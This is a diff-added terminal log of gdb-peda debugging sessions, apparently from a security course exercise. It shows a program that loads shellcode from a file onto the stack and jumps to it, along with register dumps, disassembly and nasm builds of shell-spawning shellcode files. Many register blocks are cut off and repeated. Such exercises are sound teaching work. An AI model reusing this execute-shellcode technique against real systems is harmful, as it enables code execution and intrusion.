+--]                                                                          
+RAX: 0x0 
+RBX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x0 
+RBX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x0 
+RBX: 0x0 
+RCX: 0xc ('\x0c')
+RDX: 0x10 
+RSI: 0x7fffffffe500 --> 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x0 
+RBX: 0x0 
+RCX: 0x0 
+RDX: 0x10 
+RSI: 0x7fffffffe500 --> 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x0 
+RBX: 0x0 
+RCX: 0x0 
+RDX: 0x10 
+RSI: 0x7fffffffe500 --> 0x0 
+RDI: 0x7fffffffe580 --> 0x4009b0 (<__libc_csu_init>:    push   r15)
+RBP: 0x7fffffffe5a0 --> 0x0 
+RSP: 0x7fffffffe4d0 --> 0x7fffffffe688 --> 0x7fffffffe8a9 ("/home/sp794/invitr
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x7fffffffe688 --> 0x7fffffffe8a9 ("/home/sp794/invitro2")
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x7fffffffe690 --> 0x7fffffffe8be ("shellcode")
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x7fffffffe8be ("shellcode")
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x7fffffffe8be ("shellcode")
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x7fffffffe8be ("shellcode")
+RBX: 0x0 
+RCX: 0x0 
+RDX: 0x10 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x602010 --> 0xfbad2488 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x602010 --> 0xfbad2488 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x602010 --> 0xfbad2488 
+RBX: 0x0 
+RCX: 0xffffffffffffffff 
+RDX: 0x0 
+RSI: 0x7ffff7b92762 --> 0x616d003d7363632c (',ccs=')
+RDI: 0x602010 --> 0xfbad2488 
+RBP: 0x7fffffffe5a0 --> 0x0 
+RSP: 0x7fffffffe4d0 --> 0x7fffffffe688 --> 0x7fffffffe8a9 ("/home/sp794/invitr
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x602010 --> 0xfbad2488 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x602010 --> 0xfbad2488 
+RBX: 0x0 
+RCX: 0xffffffffffffffff 
+RDX: 0x0 
+RSI: 0x7ffff7b92762 --> 0x616d003d7363632c (',ccs=')
+RDI: 0x602010 --> 0xfbad2488 
+RBP: 0x7fffffffe5a0 --> 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x602010 --> 0xfbad2488 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x602010 --> 0xfbad2488 
+RBX: 0x0 
+RCX: 0xffffffffffffffff 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x602010 --> 0xfbad2488 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x602010 --> 0xfbad2488 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x602010 --> 0xfbad2488 
+RBX: 0x0 
+RCX: 0xffffffffffffffff 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x0 
+RBX: 0x0 
+RCX: 0xfbad0088 
+RDX: 0x6020f0 --> 0x0 
+RSI: 0x0 
+RDI: 0x602010 --> 0xfbad2488 
+RBP: 0x7fffffffe5a0 --> 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x7fffffffe4f0 --> 0x0 
+RBX: 0x0 
+RCX: 0xfbad0088 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x7fffffffe4f0 --> 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x7fffffffe4f0 --> 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x7fffffffe4f0 --> 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x7fffffffe4f0 --> 0x0 
+RBX: 0x0 
+RCX: 0x602010 --> 0xfbad2488 
+RDX: 0x1 
+RSI: 0x8 
+RDI: 0x7fffffffe4f0 --> 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x1 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x1 
+RBX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x0 
+RBX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x0 
+RBX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x0 
+RBX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x1eb905fc03126eb 
+RBX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x1eb905fc03126eb 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x8 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x8 
+RBX: 0x0 
+RCX: 0x1eb905fc03126eb 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x8 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x8 
+RBX: 0x0 
+RCX: 0x1eb905fc03126eb 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x8 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x602010 --> 0xfbad2488 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x602010 --> 0xfbad2488 
+RBX: 0x0 
+RCX: 0x1eb905fc03126eb 
+RDX: 0x7fffffffe500 --> 0x1eb905fc03126eb 
+RSI: 0x6020f0 --> 0x0 
+RDI: 0x602010 --> 0xfbad2488 
+RBP: 0x7fffffffe5a0 --> 0x0 
+RSP: 0x7fffffffe4d0 --> 0x7fffffffe688 --> 0x7fffffffe8a9 ("/home/sp794/invitr
+o2")                                                                         
+RIP: 0x4008e1 (<main+340>:      call   0x400670 <feof@plt>)
+R8 : 0x1000 
+R9 : 0x0 
+R10: 0x22 ('"')
+R11: 0x246 
+R12: 0x4006a0 (<_start>:        xor    ebp,ebp)
+R13: 0x7fffffffe680 --> 0x2 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x293 (CARRY parity ADJUST zero SIGN trap INTERRUPT direction overflo)
+[-------------------------------------code------------------------------------
+-]                                                                           
+   0x4008d5 <main+328>: jg     0x4008ea <main+349>
+   0x4008d7 <main+330>: mov    rax,QWORD PTR [rbp-0xa8]
+   0x4008de <main+337>: mov    rdi,rax
+=> 0x4008e1 <main+340>: call   0x400670 <feof@plt>
+   0x4008e6 <main+345>: test   eax,eax
+   0x4008e8 <main+347>: je     0x40086e <main+225>
+   0x4008ea <main+349>: mov    DWORD PTR [rbp-0xb4],0x0
+   0x4008f4 <main+359>: jmp    0x40093b <main+430>
+Guessed arguments:
+arg[0]: 0x602010 --> 0xfbad2488 
+[------------------------------------stack------------------------------------
+-]                                                                           
+0000| 0x7fffffffe4d0 --> 0x7fffffffe688 --> 0x7fffffffe8a9 ("/home/sp794/invit
+ro2")                                                                        
+0008| 0x7fffffffe4d8 --> 0x2f7ffe1c8 
+0016| 0x7fffffffe4e0 --> 0x0 
+0024| 0x7fffffffe4e8 --> 0x9 ('\t')
+0032| 0x7fffffffe4f0 --> 0x1eb905fc03126eb 
+0040| 0x7fffffffe4f8 --> 0x602010 --> 0xfbad2488 
+0048| 0x7fffffffe500 --> 0x1eb905fc03126eb 
+0056| 0x7fffffffe508 --> 0x0 
+[-----------------------------------------------------------------------------
+-]                                                                           
+Legend: code, data, rodata, value
+0x00000000004008e1      21          for (i = 0; i < 128 && !feof(f); ++i) {
+gdb-peda$ disas
+Dump of assembler code for function main:
+   0x000000000040078d <+0>:     push   rbp
+   0x000000000040078e <+1>:     mov    rbp,rsp
+   0x0000000000400791 <+4>:     push   rbx
+   0x0000000000400792 <+5>:     sub    rsp,0xc8
+   0x0000000000400799 <+12>:    mov    DWORD PTR [rbp-0xc4],edi
+   0x000000000040079f <+18>:    mov    QWORD PTR [rbp-0xd0],rsi
+   0x00000000004007a6 <+25>:    mov    rax,QWORD PTR fs:0x28
+   0x00000000004007af <+34>:    mov    QWORD PTR [rbp-0x18],rax
+   0x00000000004007b3 <+38>:    xor    eax,eax
+   0x00000000004007b5 <+40>:    lea    rsi,[rbp-0xa0]
+   0x00000000004007bc <+47>:    mov    eax,0x0
+   0x00000000004007c1 <+52>:    mov    edx,0x10
+   0x00000000004007c6 <+57>:    mov    rdi,rsi
+   0x00000000004007c9 <+60>:    mov    rcx,rdx
+   0x00000000004007cc <+63>:    rep stos QWORD PTR es:[rdi],rax
+   0x00000000004007cf <+66>:    cmp    DWORD PTR [rbp-0xc4],0x1
+   0x00000000004007d6 <+73>:    jg     0x400805 <main+120>
+   0x00000000004007d8 <+75>:    mov    rax,QWORD PTR [rbp-0xd0]
+   0x00000000004007df <+82>:    mov    rdx,QWORD PTR [rax]
+   0x00000000004007e2 <+85>:    mov    rax,QWORD PTR [rip+0x20088f]        # 0
+x601078 <stderr@@GLIBC_2.2.5>                                                
+   0x00000000004007e9 <+92>:    mov    esi,0x400a38
+   0x00000000004007ee <+97>:    mov    rdi,rax
+   0x00000000004007f1 <+100>:   mov    eax,0x0
+   0x00000000004007f6 <+105>:   call   0x400660 <fprintf@plt>
+   0x00000000004007fb <+110>:   mov    eax,0x1
+   0x0000000000400800 <+115>:   jmp    0x40098b <main+510>
+   0x0000000000400805 <+120>:   mov    rax,QWORD PTR [rbp-0xd0]
+   0x000000000040080c <+127>:   add    rax,0x8
+   0x0000000000400810 <+131>:   mov    rax,QWORD PTR [rax]
+   0x0000000000400813 <+134>:   mov    esi,0x400a4d
+   0x0000000000400818 <+139>:   mov    rdi,rax
+   0x000000000040081b <+142>:   call   0x400690 <fopen@plt>
+   0x0000000000400820 <+147>:   mov    QWORD PTR [rbp-0xa8],rax
+   0x0000000000400827 <+154>:   cmp    QWORD PTR [rbp-0xa8],0x0
+   0x000000000040082f <+162>:   jne    0x400862 <main+213>
+   0x0000000000400831 <+164>:   mov    rax,QWORD PTR [rbp-0xd0]
+   0x0000000000400838 <+171>:   add    rax,0x8
+   0x000000000040083c <+175>:   mov    rdx,QWORD PTR [rax]
+   0x000000000040083f <+178>:   mov    rax,QWORD PTR [rip+0x200832]        # 0
+x601078 <stderr@@GLIBC_2.2.5>                                                
+   0x0000000000400846 <+185>:   mov    esi,0x400a50
+   0x000000000040084b <+190>:   mov    rdi,rax
+   0x000000000040084e <+193>:   mov    eax,0x0
+   0x0000000000400853 <+198>:   call   0x400660 <fprintf@plt>
+   0x0000000000400858 <+203>:   mov    eax,0x1
+   0x000000000040085d <+208>:   jmp    0x40098b <main+510>
+   0x0000000000400862 <+213>:   mov    DWORD PTR [rbp-0xb8],0x0
+   0x000000000040086c <+223>:   jmp    0x4008ce <main+321>
+   0x000000000040086e <+225>:   mov    QWORD PTR [rbp-0xb0],0x0
+   0x0000000000400879 <+236>:   mov    rdx,QWORD PTR [rbp-0xa8]
+   0x0000000000400880 <+243>:   lea    rax,[rbp-0xb0]
+   0x0000000000400887 <+250>:   mov    rcx,rdx
+   0x000000000040088a <+253>:   mov    edx,0x1
+   0x000000000040088f <+258>:   mov    esi,0x8
+   0x0000000000400894 <+263>:   mov    rdi,rax
+   0x0000000000400897 <+266>:   call   0x400610 <fread@plt>
+   0x000000000040089c <+271>:   lea    rdx,[rbp-0xa0]
+   0x00000000004008a3 <+278>:   mov    eax,DWORD PTR [rbp-0xb8]
+   0x00000000004008a9 <+284>:   cdqe   
+   0x00000000004008ab <+286>:   add    rdx,rax
+   0x00000000004008ae <+289>:   mov    rax,QWORD PTR [rbp-0xb0]
+   0x00000000004008b5 <+296>:   mov    QWORD PTR [rdx],rax
+   0x00000000004008b8 <+299>:   mov    eax,DWORD PTR [rbp-0xb8]
+   0x00000000004008be <+305>:   add    eax,0x8
+   0x00000000004008c1 <+308>:   mov    DWORD PTR [rbp-0xb8],eax
+   0x00000000004008c7 <+314>:   add    DWORD PTR [rbp-0xb8],0x1
+   0x00000000004008ce <+321>:   cmp    DWORD PTR [rbp-0xb8],0x7f
+   0x00000000004008d5 <+328>:   jg     0x4008ea <main+349>
+   0x00000000004008d7 <+330>:   mov    rax,QWORD PTR [rbp-0xa8]
+   0x00000000004008de <+337>:   mov    rdi,rax
+=> 0x00000000004008e1 <+340>:   call   0x400670 <feof@plt>
+   0x00000000004008e6 <+345>:   test   eax,eax
+   0x00000000004008e8 <+347>:   je     0x40086e <main+225>
+   0x00000000004008ea <+349>:   mov    DWORD PTR [rbp-0xb4],0x0
+   0x00000000004008f4 <+359>:   jmp    0x40093b <main+430>
+   0x00000000004008f6 <+361>:   mov    eax,DWORD PTR [rbp-0xb4]
+   0x00000000004008fc <+367>:   and    eax,0x7
+   0x00000000004008ff <+370>:   test   eax,eax
+   0x0000000000400901 <+372>:   jne    0x40090d <main+384>
+   0x0000000000400903 <+374>:   mov    edi,0xa
+   0x0000000000400908 <+379>:   call   0x400600 <putchar@plt>
+   0x000000000040090d <+384>:   mov    eax,DWORD PTR [rbp-0xb4]
+   0x0000000000400913 <+390>:   cdqe   
+   0x0000000000400915 <+392>:   movzx  eax,BYTE PTR [rbp+rax*1-0xa0]
+   0x000000000040091d <+400>:   movsx  eax,al
+   0x0000000000400920 <+403>:   movzx  eax,al
+   0x0000000000400923 <+406>:   mov    esi,eax
+   0x0000000000400925 <+408>:   mov    edi,0x400a77
+   0x000000000040092a <+413>:   mov    eax,0x0
+   0x000000000040092f <+418>:   call   0x400640 <printf@plt>
+   0x0000000000400934 <+423>:   add    DWORD PTR [rbp-0xb4],0x1
+   0x000000000040093b <+430>:   mov    eax,DWORD PTR [rbp-0xb4]
+   0x0000000000400941 <+436>:   cmp    eax,DWORD PTR [rbp-0xb8]
+   0x0000000000400947 <+442>:   jl     0x4008f6 <main+361>
+   0x0000000000400949 <+444>:   mov    edi,0xa
+   0x000000000040094e <+449>:   call   0x400600 <putchar@plt>
+   0x0000000000400953 <+454>:   mov    rax,QWORD PTR [rbp-0xa8]
+   0x000000000040095a <+461>:   mov    rdi,rax
+   0x000000000040095d <+464>:   call   0x400620 <fclose@plt>
+   0x0000000000400962 <+469>:   mov    rax,QWORD PTR [rip+0x20070f]        # 0
+x601078 <stderr@@GLIBC_2.2.5>                                                
+   0x0000000000400969 <+476>:   mov    edx,DWORD PTR [rbp-0xb8]
+   0x000000000040096f <+482>:   mov    esi,0x400a80
+   0x0000000000400974 <+487>:   mov    rdi,rax
+   0x0000000000400977 <+490>:   mov    eax,0x0
+   0x000000000040097c <+495>:   call   0x400660 <fprintf@plt>
+   0x0000000000400981 <+500>:   lea    rax,[rbp-0xa0]
+   0x0000000000400988 <+507>:   nop
+   0x0000000000400989 <+508>:   jmp    rax
+   0x000000000040098b <+510>:   mov    rbx,QWORD PTR [rbp-0x18]
+   0x000000000040098f <+514>:   xor    rbx,QWORD PTR fs:0x28
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x40071d (<main>:  push   rbp)
+RBX: 0x0 
+RCX: 0x0 
+RDX: 0x7fffffffe6a8 --> 0x7fffffffe8c8 ("XDG_SESSION_ID=21")
+RSI: 0x7fffffffe698 --> 0x7fffffffe8b3 ("/home/sp794/invitro2")
+RDI: 0x1 
+RBP: 0x7fffffffe5b0 --> 0x0 
+RSP: 0x7fffffffe5b0 --> 0x0 
+RIP: 0x400721 (<main+4>:        sub    rsp,0xc0)
+R8 : 0x7ffff7dd4e80 --> 0x0 
+R9 : 0x7ffff7dea530 (push   rbp)
+R10: 0x7fffffffe440 --> 0x0 
+R11: 0x7ffff7a36e50 (<__libc_start_main>:       push   r14)
+R12: 0x400630 (<_start>:        xor    ebp,ebp)
+R13: 0x7fffffffe690 --> 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflo)
+[-------------------------------------code------------------------------------
+-]                                                                           
+   0x400718 <frame_dummy+40>:   jmp    0x400690 <register_tm_clones>
+   0x40071d <main>:     push   rbp
+   0x40071e <main+1>:   mov    rbp,rsp
+=> 0x400721 <main+4>:   sub    rsp,0xc0
+   0x400728 <main+11>:  mov    DWORD PTR [rbp-0xb4],edi
+   0x40072e <main+17>:  mov    QWORD PTR [rbp-0xc0],rsi
+   0x400735 <main+24>:  lea    rsi,[rbp-0x90]
+   0x40073c <main+31>:  mov    eax,0x0
+[------------------------------------stack------------------------------------
+-]                                                                           
+0000| 0x7fffffffe5b0 --> 0x0 
+0008| 0x7fffffffe5b8 --> 0x7ffff7a36f45 (<__libc_start_main+245>:       mov   
+ edi,eax)                                                                    
+0016| 0x7fffffffe5c0 --> 0x0 
+0024| 0x7fffffffe5c8 --> 0x7fffffffe698 --> 0x7fffffffe8b3 ("/home/sp794/invit
+ro2")                                                                        
+0032| 0x7fffffffe5d0 --> 0x100000000 
+0040| 0x7fffffffe5d8 --> 0x40071d (<main>:      push   rbp)
+0048| 0x7fffffffe5e0 --> 0x0 
+0056| 0x7fffffffe5e8 --> 0xf5a6692aebe53b23 
+[-----------------------------------------------------------------------------
+-]                                                                           
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x0000000000400721 in main ()
+gdb-peda$ disas
+Dump of assembler code for function main:
+   0x000000000040071d <+0>:     push   rbp
+   0x000000000040071e <+1>:     mov    rbp,rsp
+=> 0x0000000000400721 <+4>:     sub    rsp,0xc0
+   0x0000000000400728 <+11>:    mov    DWORD PTR [rbp-0xb4],edi
+   0x000000000040072e <+17>:    mov    QWORD PTR [rbp-0xc0],rsi
+   0x0000000000400735 <+24>:    lea    rsi,[rbp-0x90]
+   0x000000000040073c <+31>:    mov    eax,0x0
+   0x0000000000400741 <+36>:    mov    edx,0x10
+   0x0000000000400746 <+41>:    mov    rdi,rsi
+   0x0000000000400749 <+44>:    mov    rcx,rdx
+   0x000000000040074c <+47>:    rep stos QWORD PTR es:[rdi],rax
+   0x000000000040074f <+50>:    cmp    DWORD PTR [rbp-0xb4],0x1
+   0x0000000000400756 <+57>:    jg     0x400785 <main+104>
+   0x0000000000400758 <+59>:    mov    rax,QWORD PTR [rbp-0xc0]
+   0x000000000040075f <+66>:    mov    rdx,QWORD PTR [rax]
+   0x0000000000400762 <+69>:    mov    rax,QWORD PTR [rip+0x200907]        # 0
+x601070 <stderr@@GLIBC_2.2.5>                                                
+   0x0000000000400769 <+76>:    mov    esi,0x400968
+   0x000000000040076e <+81>:    mov    rdi,rax
+   0x0000000000400771 <+84>:    mov    eax,0x0
+   0x0000000000400776 <+89>:    call   0x4005f0 <fprintf@plt>
+   0x000000000040077b <+94>:    mov    eax,0x1
+   0x0000000000400780 <+99>:    jmp    0x4008d5 <main+440>
+   0x0000000000400785 <+104>:   mov    rax,QWORD PTR [rbp-0xc0]
+   0x000000000040078c <+111>:   add    rax,0x8
+   0x0000000000400790 <+115>:   mov    rax,QWORD PTR [rax]
+   0x0000000000400793 <+118>:   mov    esi,0x40097d
+   0x0000000000400798 <+123>:   mov    rdi,rax
+   0x000000000040079b <+126>:   call   0x400620 <fopen@plt>
+   0x00000000004007a0 <+131>:   mov    QWORD PTR [rbp-0x10],rax
+   0x00000000004007a4 <+135>:   cmp    QWORD PTR [rbp-0x10],0x0
+   0x00000000004007a9 <+140>:   jne    0x4007dc <main+191>
+   0x00000000004007ab <+142>:   mov    rax,QWORD PTR [rbp-0xc0]
+   0x00000000004007b2 <+149>:   add    rax,0x8
+   0x00000000004007b6 <+153>:   mov    rdx,QWORD PTR [rax]
+   0x00000000004007b9 <+156>:   mov    rax,QWORD PTR [rip+0x2008b0]        # 0
+x601070 <stderr@@GLIBC_2.2.5>                                                
+   0x00000000004007c0 <+163>:   mov    esi,0x400980
+   0x00000000004007c5 <+168>:   mov    rdi,rax
+   0x00000000004007c8 <+171>:   mov    eax,0x0
+   0x00000000004007cd <+176>:   call   0x4005f0 <fprintf@plt>
+   0x00000000004007d2 <+181>:   mov    eax,0x1
+   0x00000000004007d7 <+186>:   jmp    0x4008d5 <main+440>
+   0x00000000004007dc <+191>:   mov    DWORD PTR [rbp-0x4],0x0
+   0x00000000004007e3 <+198>:   jmp    0x400836 <main+281>
+   0x00000000004007e5 <+200>:   mov    QWORD PTR [rbp-0xa8],0x0
+   0x00000000004007f0 <+211>:   mov    rdx,QWORD PTR [rbp-0x10]
+   0x00000000004007f4 <+215>:   lea    rax,[rbp-0xa8]
+   0x00000000004007fb <+222>:   mov    rcx,rdx
+   0x00000000004007fe <+225>:   mov    edx,0x1
+   0x0000000000400803 <+230>:   mov    esi,0x8
+   0x0000000000400808 <+235>:   mov    rdi,rax
+   0x000000000040080b <+238>:   call   0x4005b0 <fread@plt>
+   0x0000000000400810 <+243>:   lea    rdx,[rbp-0x90]
+   0x0000000000400817 <+250>:   mov    eax,DWORD PTR [rbp-0x4]
+   0x000000000040081a <+253>:   cdqe   
+   0x000000000040081c <+255>:   add    rdx,rax
+   0x000000000040081f <+258>:   mov    rax,QWORD PTR [rbp-0xa8]
+   0x0000000000400826 <+265>:   mov    QWORD PTR [rdx],rax
+   0x0000000000400829 <+268>:   mov    eax,DWORD PTR [rbp-0x4]
+   0x000000000040082c <+271>:   add    eax,0x8
+   0x000000000040082f <+274>:   mov    DWORD PTR [rbp-0x4],eax
+   0x0000000000400832 <+277>:   add    DWORD PTR [rbp-0x4],0x1
+   0x0000000000400836 <+281>:   cmp    DWORD PTR [rbp-0x4],0x7f
+   0x000000000040083a <+285>:   jg     0x40084c <main+303>
+   0x000000000040083c <+287>:   mov    rax,QWORD PTR [rbp-0x10]
+   0x0000000000400840 <+291>:   mov    rdi,rax
+   0x0000000000400843 <+294>:   call   0x400600 <feof@plt>
+   0x0000000000400848 <+299>:   test   eax,eax
+   0x000000000040084a <+301>:   je     0x4007e5 <main+200>
+   0x000000000040084c <+303>:   mov    DWORD PTR [rbp-0x8],0x0
+   0x0000000000400853 <+310>:   jmp    0x400891 <main+372>
+   0x0000000000400855 <+312>:   mov    eax,DWORD PTR [rbp-0x8]
+   0x0000000000400858 <+315>:   and    eax,0x7
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x40071d (<main>:  push   rbp)
+RBX: 0x0 
+RCX: 0x0 
+RDX: 0x7fffffffe6a0 --> 0x7fffffffe8c8 ("XDG_SESSION_ID=21")
+RSI: 0x7fffffffe688 --> 0x7fffffffe8a9 ("/home/sp794/invitro2")
+RDI: 0x2 
+RBP: 0x7fffffffe5a0 --> 0x0 
+RSP: 0x7fffffffe5a0 --> 0x0 
+RIP: 0x400721 (<main+4>:        sub    rsp,0xc0)
+R8 : 0x7ffff7dd4e80 --> 0x0 
+R9 : 0x7ffff7dea530 (push   rbp)
+R10: 0x7fffffffe430 --> 0x0 
+R11: 0x7ffff7a36e50 (<__libc_start_main>:       push   r14)
+R12: 0x400630 (<_start>:        xor    ebp,ebp)
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x29 (')')
+RBX: 0x0 
+RCX: 0xffffffffffffffff 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x7fffffffe510 --> 0x1eb905fc03126eb 
+RBX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x7fffffffe510 --> 0x1eb905fc03126eb 
+RBX: 0x0 
+RCX: 0xffffffffffffffff 
+RDX: 0x7ffff7dd59d0 --> 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x7fffffffe510 --> 0x1eb905fc03126eb 
+RBX: 0x0 
+RCX: 0xffffffffffffffff 
+RDX: 0x7ffff7dd59d0 --> 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x7fffffffe510 --> 0x1eb905fc03126eb 
+RBX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x7fffffffe510 --> 0x1eb905fc03126eb 
+RBX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x7fffffffe510 --> 0x1eb905fc03126eb 
+RBX: 0x0 
+RCX: 0xffffffffffffffff 
+RDX: 0x7ffff7dd59d0 --> 0x0 
+RSI: 0x7fffffffbde0 ("Read 72 bytes of shellcode! Executing...\n")
+RDI: 0x2 
+RBP: 0x7fffffffe5a0 --> 0x0 
+RSP: 0x7fffffffe4e0 --> 0x7fffffffe688 --> 0x7fffffffe8a9 ("/home/sp794/invitr
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x7fffffffe510 --> 0x1eb905fc03126eb 
+RBX: 0x0 
+RCX: 0xffffffffffffffff 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x7fffffffe510 --> 0x1eb905fc0310bfb 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x7fffffffe510 --> 0x1eb905fc0310bfb 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x7fffffffe510 --> 0x1eb905fc0310bfb 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x7fffffffe510 --> 0x1eb905fc0310bfb 
+RBX: 0x0 
+RCX: 0xffffffffffffffff 
+RDX: 0x7ffff7dd59d0 --> 0x0 
+RSI: 0x7fffffffbde0 ("Read 72 bytes of shellcode! Executing...\n")
+RDI: 0x5 
+RBP: 0x7fffffffe5a0 --> 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x7fffffffe510 --> 0x1eb905fc0310bfb 
+RBX: 0x0 
+RCX: 0xffffffffffffffff 
+RDX: 0x7ffff7dd59d0 --> 0x0 
+RSI: 0x7fffffffbde0 ("Read 72 bytes of shellcode! Executing...\n")
+RDI: 0x5 
+RBP: 0x7fffffffe5a0 --> 0x0 
+RSP: 0x7fffffffe4d8 --> 0x7fffffffe542 --> 0x6e69622f0001eb90 
+RIP: 0x7fffffffe522 --> 0x1eb909041077780 
+R8 : 0x7ffff7fee740 (0x00007ffff7fee740)
+R9 : 0x6365784520216564 ('de! Exec')
+R10: 0x2e2e2e676e697475 ('uting...')
+R11: 0x246 
+R12: 0x400630 (<_start>:        xor    ebp,ebp)
+R13: 0x7fffffffe680 --> 0x2 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflo)
+[-------------------------------------code------------------------------------
+-]                                                                           
+   0x7fffffffe51d:      nop
+   0x7fffffffe51e:      nop
+   0x7fffffffe51f:      jmp    0x7fffffffe522
+   0x7fffffffe521:      add    BYTE PTR [rax-0x6fbef889],al
+   0x7fffffffe527:      nop
+   0x7fffffffe528:      jmp    0x7fffffffe52b
+   0x7fffffffe52a:      add    BYTE PTR [rax+0x31],cl
+   0x7fffffffe52d:      (bad)
+[------------------------------------stack------------------------------------
+-]                                                                           
+0000| 0x7fffffffe4d8 --> 0x7fffffffe542 --> 0x6e69622f0001eb90 
+0008| 0x7fffffffe4e0 --> 0x7fffffffe688 --> 0x7fffffffe8a9 ("/home/sp794/invit
+ro2")                                                                        
+0016| 0x7fffffffe4e8 --> 0x200000000 
+0024| 0x7fffffffe4f0 --> 0x0 
+0032| 0x7fffffffe4f8 --> 0x0 
+0040| 0x7fffffffe500 --> 0x0 
+0048| 0x7fffffffe508 --> 0x7ffff7ffe520 --> 0x7ffff7ffe480 --> 0x7ffff7ff99c8 
+--> 0x7ffff7ffe1c8 --> 0x0                                                   
+0056| 0x7fffffffe510 --> 0x1eb905fc0310bfb 
+[-----------------------------------------------------------------------------
+-]                                                                           
+Legend: code, data, rodata, value
+0x00007fffffffe522 in ?? ()
+gdb-peda$ q
+sp794@c-challenges-sp794-1:~$ nasm -felf64 shell
+shellcode                 shellcode-sh-withnop.asm
+shellcode.asm             shelltest2
+shellcode.o               shelltest2.c
+shellcode-sh.asm          
+sp794@c-challenges-sp794-1:~$ nasm -felf64 shell
+shellcode                 shellcode-sh-withnop.asm
+shellcode.asm             shelltest2
+shellcode.o               shelltest2.c
+shellcode-sh.asm          
+<~$ nasm -felf64 shellcode-sh-withnop.asm -o shellcode-withnop.o           
+sp794@c-challenges-sp794-1:~$ objdump shellcode-withnop.o 
+Usage: objdump <option(s)> <file(s)>
+ Display information from object <file(s)>.
+ At least one of the following switches must be given:
+  -a, --archive-headers    Display archive header information
+  -f, --file-headers       Display the contents of the overall file header
+  -p, --private-headers    Display object format specific file header contents
+  -P, --private=OPT,OPT... Display object format specific contents
+  -h, --[section-]headers  Display the contents of the section headers
+  -x, --all-headers        Display the contents of all headers
+  -d, --disassemble        Display assembler contents of executable sections
+  -D, --disassemble-all    Display assembler contents of all sections
+  -S, --source             Intermix source code with disassembly
+  -s, --full-contents      Display the full contents of all sections requested
+  -g, --debugging          Display debug information in object file
+  -e, --debugging-tags     Display debug information using ctags style
+  -G, --stabs              Display (in raw form) any STABS info in the file
+  -W[lLiaprmfFsoRt] or
+  --dwarf[=rawline,=decodedline,=info,=abbrev,=pubnames,=aranges,=macro,=frame
